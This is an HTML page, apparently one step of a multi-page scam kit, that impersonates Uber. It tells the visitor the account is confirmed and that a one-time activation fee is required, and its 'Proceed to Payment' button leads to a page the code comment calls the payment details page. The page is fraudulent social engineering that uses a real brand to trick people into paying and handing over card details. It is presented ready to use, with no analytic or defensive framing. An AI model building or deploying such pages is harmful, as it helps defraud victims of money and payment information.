<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Activation Required</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            background-color: white;
            font-family: Arial, sans-serif;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .top-bar {
            background-color: black;
            width: 100%;
            padding: 15px 0;
            color: white;
            font-size: 2rem;
            font-weight: bold;
            text-align: center;
            position: fixed;
            top: 0;
            left: 0;
        }
        .content {
            max-width: 600px;
            padding: 100px 20px 20px;
            font-size: 1.5rem;
            color: black;
            text-align: center;
            margin-top: 60px;
        }
        .proceed-button {
            margin-top: 20px;
            background-color: black;
            color: white;
            padding: 15px 30px;
            font-size: 1.5rem;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .proceed-button:hover {
            background-color: #333;
        }
    </style>
</head>
<body>
    <div class="top-bar">Uber</div>
    <div class="content">
        <h2>Account Confirmed</h2>
        <p>Your account has been confirmed. A one-time activation fee is required to complete the process.</p>
        <button class="proceed-button" onclick="redirectToPayment()">Proceed to Payment</button>
    </div>

    <script>
        function redirectToPayment() {
            window.location.href = "3.html"; // Link to the payment details page
        }
    </script>
</body>
</html>
